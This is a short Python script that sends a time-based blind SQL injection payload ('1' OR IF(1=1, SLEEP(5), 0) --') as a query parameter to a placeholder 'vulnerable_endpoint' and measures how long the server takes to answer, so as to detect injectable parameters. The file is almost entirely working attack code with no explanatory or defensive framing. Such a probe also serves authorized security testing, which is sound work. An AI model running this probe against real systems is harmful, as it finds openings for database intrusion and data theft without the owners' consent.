# response_time_analysis.py

import requests
import time

class ResponseTimeAnalyzer:
    def __init__(self, target_url):
        self.target_url = target_url

    def analyze_response_time(self, payload):
        try:
            start_time = time.time()
            response = requests.get(self.target_url, params={"param": payload})
            end_time = time.time()
            
            response_time = end_time - start_time
            return response_time

        except requests.exceptions.RequestException as e:
            print(f"Error: {e}")
            return None

# Example usage:
if __name__ == "__main__":
    target_url = "https://example.com/vulnerable_endpoint"
    analyzer = ResponseTimeAnalyzer(target_url)
    
    # Analyze response time for a payload
    payload = "1' OR IF(1=1, SLEEP(5), 0) --"
    response_time = analyzer.analyze_response_time(payload)
    print(f"Response time: {response_time} seconds")
